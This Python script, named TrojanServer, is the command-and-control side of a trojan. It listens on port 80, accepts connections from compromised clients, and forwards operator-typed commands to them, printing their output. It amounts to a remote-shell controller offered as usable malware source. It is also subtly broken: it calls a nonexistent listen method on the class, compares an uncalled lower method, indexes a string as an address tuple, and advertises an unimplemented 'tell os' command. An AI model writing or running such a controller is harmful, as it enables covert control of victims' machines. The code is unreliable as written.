#!/usr/bin/python3

import socket, threading

class TrojanServer(object):
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 80
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.host, self.port))
        print("Server running...")

    def listener(self):
        self.listen(10)
        while True:
            client, adress = self.s.accept()
            ipstr = adress[0] + ":" + str(adress[1])
            client.settimeout(60)
            threading.Thread(target=self.client_conn, name=ipstr, args=(client, ipstr)).start()

    def client_conn(self, client, adress):
        while True:
            ipstr = adress[0] + ":" + str(adress[1]) + ">>"
            cmd = ""
            while cmd == "":
                cmd = input(ipstr).strip()

            if cmd.lower == "show clients":
                print("Clients:")
                print("===========")
                for t in threading.enumerate():
                    print(t.getName())

            elif cmd.lower().startswith("userconn"):
                tmp = cmd.split(" ")
                for t in threading.enumerate():
                    if(t.getName() == tmp[1].strip()):
                        t.join()
            
            elif cmd.lower() == "help" or cmd.lower() == "?":
                print("Commands:")
                print("===========")
                print("show clients         - Shows all connected clients")
                print("userconn [IP:PORT]   - Switch to the connection")
                print("tell os              - Show OS of all Clients")
                print("help                 - Show this help")

            else:
                try:
                    b_arr = bytearray()
                    b_arr.extend(map(ord, cmd))
                    client.send(b_arr)
                    
                    data = client.recv(8192).decode("UTF-8", errors="replace")

                    if data:
                        print(str(data))
                        if str(data) == "Bye!":
                            raise ConnectionError("Client discornnected")
                    else:
                        raise ConnectionError("Client discornnected")
                except ConnectionError:
                    print("Client", str(adress), "disconnected")
                    client.close()
                    return False

if __name__ == "__main__":
    server = TrojanServer()
    server.listener()        
